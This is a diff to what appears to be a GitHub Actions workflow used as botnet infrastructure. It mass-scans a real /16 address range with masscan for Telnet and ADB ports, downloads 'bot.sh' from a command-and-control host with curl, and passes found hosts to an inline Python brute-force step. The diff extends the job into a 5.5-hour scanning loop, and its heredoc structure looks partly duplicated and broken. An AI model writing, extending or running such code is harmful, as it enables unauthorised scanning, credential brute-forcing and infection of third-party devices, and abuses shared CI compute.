@@ -14,7 +14,7 @@ on:
       scan_target:
         description: 'CIDR to scan'
         required: true
-        default: '114.55.0.0/16'
+        default: '114.54.0.0/16'
   schedule:
     - cron: '37 */6 * * *'
 
@@ -33,16 +33,38 @@ jobs:
           CIDR="${{ github.event.inputs.scan_target }}"
           S="${{ matrix.slice }}"
 
-          echo "[+] Runner $S hunting $CIDR -> C2: $C2:$CPORT"
+          echo "[+] Runner $S/${{ matrix.slice }} hunting $CIDR -> C2: $C2:$CPORT"
           sudo apt-get update -qq && sudo apt-get install -y -qq masscan 2>/dev/null
-
-          # Download payload
           curl -s "http://$C2:$CPORT/bot.sh" -o /tmp/payload.sh
 
-          # Masscan
-          echo "[+] Scanning..."
-          sudo masscan "$CIDR" -p23,2323,5555 --rate 5000 -oL /tmp/scan.txt 2>/dev/null || true
-          echo "[+] Scan done: $(wc -l < /tmp/scan.txt) lines"
+          # Continuous hunting loop - each round scans a different slice
+          ROUND=0
+          END_TIME=$(($(date +%s) + 19800))  # 5.5 hours
+
+          while [ $(date +%s) -lt $END_TIME ]; do
+            ROUND=$((ROUND + 1))
+
+            # Calculate a pseudo-random slice offset based on round + runner
+            OFFSET=$(( (ROUND * 20 + $S) * 3277 % 65536 ))
+
+            SLICE_RANGE=$(python3 -c "
+            base_ip = '$CIDR'.split('/')[0]
+            parts = [int(x) for x in base_ip.split('.')]
+            base = (parts[0]<<24)|(parts[1]<<16)|(parts[2]<<8)|parts[3]
+            start = base + $OFFSET
+            end = min(base + 65535, start + 3276)
+            def ip(n): return f'{(n>>24)&255}.{(n>>16)&255}.{(n>>8)&255}.{n&255}'
+            print(f'{ip(start)}-{ip(end)}')
+            ")
+
+            echo "[+] Round $ROUND | Slice $S offset=$OFFSET range=$SLICE_RANGE"
+
+            sudo masscan "$SLICE_RANGE" -p23,2323,5555 --rate 5000 -oL /tmp/scan.txt 2>/dev/null || true
+            FOUND=$(grep -c open /tmp/scan.txt 2>/dev/null || echo 0)
+            echo "[+] Found: $FOUND open ports"
+
+            if [ "$FOUND" -gt 0 ]; then
+              python3 /dev/stdin "$C2" "$CPORT" "$S" << 'PYEOF'
 
           # Brute force
           python3 /dev/stdin "$C2" "$CPORT" "$S" << 'PYEOF'
@@ -120,6 +142,9 @@ jobs:
           for h in hits: print(f"    {h}")
           time.sleep(30)
           PYEOF
+            fi
 
-          echo "[+] Runner $S done"
-          sleep 60
+            echo "[+] Round $ROUND done — ${FOUND} targets"
+          done
+
+          echo "[+] Runner $S finished after $ROUND rounds"
